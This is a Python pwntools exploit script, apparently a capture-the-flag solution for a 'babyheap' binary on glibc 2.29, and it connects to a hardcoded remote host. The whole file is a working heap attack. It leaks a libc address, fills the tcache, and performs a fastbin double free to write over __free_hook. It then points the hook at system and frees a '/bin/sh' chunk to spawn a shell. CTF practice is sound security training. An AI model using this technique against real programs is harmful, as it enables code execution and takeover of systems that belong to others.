#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./lib/ld-2.29.so --library-path ./lib/ ./babyheap"
#pwn_file = "./babyheap"
elf=ELF("./babyheap")
libc = ELF("./lib/libc.so.6")

if len(sys.argv)==1:
    r=process(pwn_file.split())
    pid=r.pid
else:
    r=remote("34.92.96.238",10001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def addinfo(size,name='',phone=''):
    r.sendlineafter("choice:",'1')
    r.sendlineafter("Please input the size of girl's name\n",str(size))
    r.sendlineafter("please inpute her name:\n", name)
    r.sendlineafter("please input her call:\n", phone)
    r.recvuntil("Done!\n")

def showinfo(index):
    r.sendlineafter("choice:",'2')
    r.sendlineafter("Please input the index:\n",str(index))
    r.recvuntil('name:\n')

def delete(index):
    r.sendlineafter("choice:",'4')
    r.sendlineafter("Please input the index:\n",str(index))

name = 'xuliaji'
phone = "12345678910"


addinfo(0x440,name,phone) #0
addinfo(0x18, name,phone) #1
delete(0)
showinfo(0)

leak = u64(r.recv(6).ljust(8,'\x00'))
info("leak: %16x",leak)
libc.address = leak  - (0x7fe6d8ccfca0 - 0x7fe6d891e000)
info("libc.address: %16x",libc.address)
one_gadget = libc.address  + 0xdf991

info("one_gadget :%16x", one_gadget)
info("system :%16x", libc.sym['system'])
info("free_hook: %16x", libc.sym['__free_hook'])
debug()
addinfo(0x440) #2
## fill tcache
addinfo(0x68)#3
addinfo(0x68)#4
addinfo(0x68)#5
addinfo(0x68)#6
addinfo(0x68)#7
addinfo(0x68)#8
addinfo(0x68)#9
addinfo(0x68)#10
addinfo(0x68)#11
delete(9)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(8)

addinfo(0x68) #12
addinfo(0x68) #13

#fill tcache
delete(10)
delete(11)

delete(12)
delete(13)
delete(12)

malloc_block = libc.sym['__free_hook'] - 0x13
 
# add 7 次 用完tcache...
addinfo(0x68)#14
addinfo(0x68)#15
addinfo(0x68)#16
addinfo(0x68)#17
addinfo(0x68)#18
addinfo(0x68)#19
addinfo(0x68)#20

#addinfo(0x410) #20
addinfo(0x68, p64(malloc_block)) #21
addinfo(0x68) #22
addinfo(0x68, "/bin/sh\x00") #23
payload2 = 'a'*0x13 + p64(libc.sym["system"])
addinfo(0x68, payload2) #24

debug()
delete(23)

r.interactive()
